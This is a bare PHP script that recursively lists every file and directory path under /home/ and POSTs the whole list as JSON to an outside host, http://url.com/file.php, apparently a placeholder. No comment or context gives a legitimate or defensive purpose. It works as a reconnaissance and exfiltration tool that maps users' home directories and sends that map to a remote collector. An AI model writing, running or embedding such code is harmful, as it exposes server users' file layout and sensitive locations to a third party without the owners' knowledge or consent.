<?php
function getDirContents($dir, &$results = array()){
    $files = scandir($dir);

    foreach($files as $key => $value){
        $path = realpath($dir.DIRECTORY_SEPARATOR.$value);
        if(!is_dir($path)) {
            $results[] = $path;
        } else if($value != "." && $value != "..") {
            getDirContents($path, $results);
            $results[] = $path;
        }
    }

    return $results;
}

$file_info = getDirContents('/home/');

//step1
$cSession = curl_init(); 
//step2
$user=json_encode($file_info);
echo $user;
curl_setopt($cSession,CURLOPT_URL,"http://url.com/file.php");
curl_setopt($cSession,CURLOPT_RETURNTRANSFER,true);
curl_setopt($cSession, CURLOPT_POST, 1);
curl_setopt($cSession, CURLOPT_CUSTOMREQUEST, "POST");
curl_setopt($cSession, CURLOPT_POSTFIELDS, $user);
//step3
$result=curl_exec($cSession);
//step4
curl_close($cSession);
//step5
?>
